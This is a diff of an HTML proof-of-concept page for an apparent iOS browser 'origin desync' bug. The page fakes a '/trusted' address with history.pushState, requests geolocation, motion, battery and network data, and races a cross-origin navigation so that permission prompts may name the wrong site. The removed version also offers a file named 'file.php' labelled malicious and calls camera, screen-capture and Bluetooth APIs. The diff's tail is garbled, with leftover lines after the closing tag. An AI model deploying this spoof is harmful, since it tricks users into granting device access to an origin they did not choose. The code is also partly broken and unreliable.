@@ -2,261 +2,123 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Origin Desync Login PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>iOS Permission Origin Desync – Related APIs PoC</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 
 <style>
 body {
-  margin:0;
   font-family:-apple-system,BlinkMacSystemFont,system-ui;
   background:#f5f5f7;
+  margin:0;
 }
-
-button {
-  margin:6px;
-  font-size:14px;
-  padding:8px 12px;
-}
-
-#panel {
-  display:none;
-  max-width:520px;
-  margin:60px auto;
+#box {
+  max-width:480px;
+  margin:70px auto;
   background:#fff;
-  padding:24px;
-  border-radius:16px;
-  box-shadow:0 20px 60px rgba(0,0,0,.2);
+  padding:22px;
+  border-radius:14px;
+  box-shadow:0 18px 50px rgba(0,0,0,.25);
 }
-
-h2 { text-align:center; margin-bottom:6px; }
-.sub { text-align:center; color:#666; margin-bottom:20px; }
-
-.notice {
-  margin-top:14px;
-  font-size:13px;
-  color:#b00020;
-}
-
-.download-button {
-  margin-top:20px;
-  width:100%;
-  padding:12px;
-  font-size:16px;
-  border-radius:10px;
+button {
+  padding:12px 16px;
+  font-size:15px;
   border:none;
+  border-radius:10px;
   background:#007aff;
   color:#fff;
 }
-
-video { width:100%; margin-top:10px; }
-
 pre {
-  margin-top:12px;
+  margin-top:14px;
   background:#111;
   color:#0f0;
-  padding:10px;
-  font-size:11px;
+  padding:12px;
+  font-size:12px;
   max-height:260px;
   overflow:auto;
 }
+.small { color:#666; font-size:12px; }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center">
-  <button id="trigger">Start PoC</button>
-</div>
+<div id="box">
+  <h3>Secure Dashboard</h3>
+  <p class="small">Trusted origin required</p>
 
-<div id="panel">
-  <h2>Download File</h2>
-  <div class="sub">Click below to download file.php</div>
-
-  <button class="download-button" onclick="downloadFile()">
-    Download File (file.php)
-  </button>
-
-  <hr>
-
-  <button onclick="getLocation()">Get Location</button>
-  <p id="locationOutput">Location: -</p>
-
-  <button onclick="openCamera()">Open Camera</button>
-  <video id="camera" autoplay playsinline></video>
-
-  <hr>
-
-  <button onclick="callAllAPIs()">CALL ALL APIs</button>
-  <div class="notice">
-    Demo only — browser permission required
-  </div>
+  <button id="start">Start PoC</button>
+  <pre id="log"></pre>
 </div>
 
 <script>
-const panel = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-
-  // Redirect to google.com after 80ms (simulating the origin desync)
-  setTimeout(() => {
-    location.href = 'http://google.com:9090';
-  }, 23);
+const log = m => {
+  const l = document.getElementById('log');
+  l.textContent += m + "\n";
 };
 
-/* ====================== Functions ====================== */
-function downloadFile() {
-  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
-  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-  const fileUrl = URL.createObjectURL(fileBlob);
+document.getElementById('start').onclick = async () => {
+  log("== START ==");
+  
+  /* 1️⃣ Fake trusted URL */
+  history.pushState({}, '', '/trusted');
 
-  const downloadLink = document.createElement('a');
-  downloadLink.href = fileUrl;
-  downloadLink.download = 'file.php';
-  document.body.appendChild(downloadLink);
-  downloadLink.click();
-  document.body.removeChild(downloadLink);
-}
+  log("Visible URL changed to /trusted");
 
-function getLocation() {
-  const output = document.getElementById('locationOutput');
-  if (!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(
-    pos => output.textContent =
-      `${pos.coords.latitude}, ${pos.coords.longitude}`,
-    () => output.textContent = 'Permission denied'
-  );
-}
-
-function openCamera() {
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(s => document.getElementById('camera').srcObject = s)
-    .catch(() => alert('Camera denied'));
-}
-
-/* ====================== Call APIs ====================== */
-async function callAllAPIs() {
-  // Geolocation API
+  /* 2️⃣ GEOLOCATION (core bug) */
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
-      pos => alert("Geolocation: " + pos.coords.latitude + ", " + pos.coords.longitude),
-      err => alert("Geolocation: Permission denied")
+      () => log("Geolocation: SUCCESS"),
+      () => log("Geolocation: DENIED")
     );
   }
 
-  // Fetch API
-  try {
-    const response = await fetch('https://jsonplaceholder.typicode.com/todos/1');
-    const data = await response.json();
-    alert('Fetch API: Data fetched successfully');
-  } catch {
-    alert("Fetch API: Error");
+  /* 3️⃣ DEVICE ORIENTATION */
+  window.addEventListener('deviceorientation', e => {
+    log("Orientation event fired");
+  }, { once:true });
+
+  /* 4️⃣ DEVICE MOTION */
+  window.addEventListener('devicemotion', () => {
+    log("Motion event fired");
+  }, { once:true });
+
+  /* 5️⃣ BATTERY (async system info) */
+  if (navigator.getBattery) {
+    const b = await navigator.getBattery();
+    log("Battery level: " + Math.round(b.level * 100) + "%");
   }
 
-  // Web Storage API
-  try {
-    localStorage.setItem('test', '1');
-    sessionStorage.setItem('test', '1');
-    alert("Web Storage API: OK");
-  } catch {
-    alert("Web Storage API: Error");
+  /* 6️⃣ NETWORK INFO */
+  if (navigator.connection) {
+    log("Network type: " + navigator.connection.effectiveType);
   }
 
-  // Notification API
-  if (Notification) {
-    const permission = await Notification.requestPermission();
-    alert("Notification: " + permission);
-  }
+  /* 7️⃣ VIBRATION (system mediated) */
+  navigator.vibrate?.(100);
+  log("Vibration requested");
 
-  // Service Workers API
-  if ('serviceWorker' in navigator) {
+  /* 8️⃣ PERMISSION STATE OBSERVATION */
+  if (navigator.permissions) {
     try {
-      await navigator.serviceWorker.register('/service-worker.js');
-      alert("Service Worker API: Registered");
-    } catch {
-      alert("Service Worker API: Registration failed");
-    }
+      const p = await navigator.permissions.query({ name:'geolocation' });
+      log("Permission[geolocation]: " + p.state);
+    } catch {}
   }
 
-  // WebRTC API
-  try {
-    await navigator.mediaDevices.getUserMedia({ audio: true });
-    alert("WebRTC API: OK");
-  } catch {
-    alert("WebRTC API: Permission denied");
-  }
-
-  // Web Bluetooth API
-  if ('bluetooth' in navigator) {
-    try {
-      const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
-      alert("Web Bluetooth API: OK");
-    } catch {
-      alert("Web Bluetooth API: Permission denied");
-    }
-  }
-
-  // Device Orientation API
-  if (window.DeviceOrientationEvent) {
-    window.addEventListener('deviceorientation', (e) => {
-      alert("Device Orientation: " + e.alpha);
+  /* 9️⃣ NAVIGATION RACE */
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        log("Navigating cross-origin…");
+        location.href = 'https://google.com:9090';
+      }, 60);
     });
-  }
+  });
+};
+</script>
 
-  // Web Share API
-  if (navigator.share) {
-    try {
-      await navigator.share({ title: "Test", text: "Check this out!", url: window.location.href });
-      alert("Web Share API: OK");
-    } catch {
-      alert("Web Share API: Permission denied");
-    }
-  }
-
-  // Web MIDI API
-  if (navigator.requestMIDIAccess) {
-    try {
-      await navigator.requestMIDIAccess();
-      alert("Web MIDI API: OK");
-    } catch {
-      alert("Web MIDI API: Permission denied");
-    }
-  }
-
-  // Push Notifications API
-  if ('PushManager' in window) {
-    try {
-      const permission = await Notification.requestPermission();
-      alert("Push Notifications API: " + permission);
-    } catch {
-      alert("Push Notifications API: Permission denied");
-    }
-  }
-
-  // Clipboard API
-  try {
-    await navigator.clipboard.writeText("Test Clipboard");
-    alert("Clipboard API: OK");
-  } catch {
-    alert("Clipboard API: Permission denied");
-  }
-
-  // Screen Capture API
-  try {
-    await navigator.mediaDevices.getDisplayMedia();
-    alert("Screen Capture API: OK");
-  } catch {
-    alert("Screen Capture API: Permission denied");
-  }
-
-  // Background Sync API
-  if ('sync' in navigator) {
-    try {
-      await navigator.serviceWorker.ready.then(registration => registration.sync.register('sync_tag'));
-      alert("Background Sync API: Registered");
-    } catch {
+</body>
+</html>
       alert("Background Sync API: Error");
     }
   }
@@ -427,4 +289,5 @@ async function callAllAPIs() {
 
 </body>
 </html>
+
 
